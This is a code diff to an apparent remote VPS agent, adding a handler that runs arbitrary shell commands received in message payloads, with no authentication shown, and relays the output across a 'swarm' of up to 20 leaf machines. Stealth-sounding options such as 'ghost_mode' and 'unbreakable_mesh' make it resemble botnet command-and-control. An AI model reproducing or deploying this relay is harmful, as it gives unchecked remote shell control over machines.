@@ -5910,6 +5910,38 @@ class CyberVPSAgent:
             }
         })
 
+    def handle_tree_cross_route(self, payload):
+        req_id = payload.get("request_id")
+        action = payload.get("action", "ping")
+        from_leaf = payload.get("from_leaf", "unknown")
+        data = payload.get("payload", {})
+        res = {
+            "success": True,
+            "request_id": req_id,
+            "from_leaf": from_leaf,
+            "target_leaf": self.machine_id,
+            "branch": getattr(self, "swarm_cluster", self.machine_id),
+            "leaf_index": getattr(self, "swarm_index", 1),
+            "action": action,
+            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+        }
+        if action == "ping":
+            res["pong"] = True
+            res["hostname"] = socket.gethostname()
+            res["platform"] = platform.system()
+        elif action == "execute":
+            cmd = data.get("command") or payload.get("command") or "whoami"
+            try:
+                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
+                res["output"] = out.decode("utf-8", errors="replace")
+            except Exception as e:
+                res["success"] = False
+                res["error"] = str(e)
+        self.send_agent_event({
+            "type": "TreeCrossRouteResult",
+            "payload": res
+        })
+
     def handle_cloudflare_tunnel_status(self, payload):
         req_id = payload.get("request_id")
         tunnels_list = []
@@ -9520,6 +9552,8 @@ class CyberVPSAgent:
             threading.Thread(target=self.handle_cloudflare_tunnel_stop, args=(payload,), daemon=True).start()
         elif c_type in ["CloudflareTunnelStatus", "CloudflareTunnelList"]:
             threading.Thread(target=self.handle_cloudflare_tunnel_status, args=(payload,), daemon=True).start()
+        elif c_type in ["TreeCrossRoute", "TreeCrossCommand"]:
+            threading.Thread(target=self.handle_tree_cross_route, args=(payload,), daemon=True).start()
         elif c_type in ["FileRun", "ProcessStart"]:
             threading.Thread(target=self.handle_file_run, args=(payload,), daemon=True).start()
         elif c_type == "ProcessStatus":
@@ -10748,8 +10782,13 @@ class CyberVPSAgent:
                 "capabilities": list(dict.fromkeys(caps + ["cloudflare_tunnel", "swarm_worker", "unbreakable_mesh"])),
                 "swarm_role": "coordinator" if getattr(self, "swarm_index", 1) == 1 else "worker",
                 "swarm_index": getattr(self, "swarm_index", 1),
-                "swarm_total": getattr(self, "swarm_total", 1),
+                "swarm_total": getattr(self, "swarm_total", 20),
                 "swarm_cluster": getattr(self, "swarm_cluster", self.machine_id),
+                "tree_role": "leaf",
+                "tree_branch": getattr(self, "swarm_cluster", self.machine_id),
+                "tree_leaf_id": self.machine_id,
+                "tree_leaf_index": getattr(self, "swarm_index", 1),
+                "tree_leaf_total": getattr(self, "swarm_total", 20),
                 "profile": profile,
                 "runtime_paths": self.get_runtime_paths() if hasattr(self, "get_runtime_paths") else {},
                 "backend_inventory": self.get_backend_inventory() if hasattr(self, "get_backend_inventory") else []
@@ -10806,8 +10845,13 @@ class CyberVPSAgent:
                                 "ghost_mode": getattr(self, "ghost_mode", False),
                                 "swarm_role": "coordinator" if getattr(self, "swarm_index", 1) == 1 else "worker",
                                 "swarm_index": getattr(self, "swarm_index", 1),
-                                "swarm_total": getattr(self, "swarm_total", 1),
+                                "swarm_total": getattr(self, "swarm_total", 20),
                                 "swarm_cluster": getattr(self, "swarm_cluster", self.machine_id),
+                                "tree_role": "leaf",
+                                "tree_branch": getattr(self, "swarm_cluster", self.machine_id),
+                                "tree_leaf_id": self.machine_id,
+                                "tree_leaf_index": getattr(self, "swarm_index", 1),
+                                "tree_leaf_total": getattr(self, "swarm_total", 20),
                                 "cloudflare_tunnel_url": getattr(self, "active_public_tunnel", None),
                                 "runtime_paths": self.get_runtime_paths() if hasattr(self, "get_runtime_paths") else {},
                                 "backend_inventory": self.get_backend_inventory() if hasattr(self, "get_backend_inventory") else []
